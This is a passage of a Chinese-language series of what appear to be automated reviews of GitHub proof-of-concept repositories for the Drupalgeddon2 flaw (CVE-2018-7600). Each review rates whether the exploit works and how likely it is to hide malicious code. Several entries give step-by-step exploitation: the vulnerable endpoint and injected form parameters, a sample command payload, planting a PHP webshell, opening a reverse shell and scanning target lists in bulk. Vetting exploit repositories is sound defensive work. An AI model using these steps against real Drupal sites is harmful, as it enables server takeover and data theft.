对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

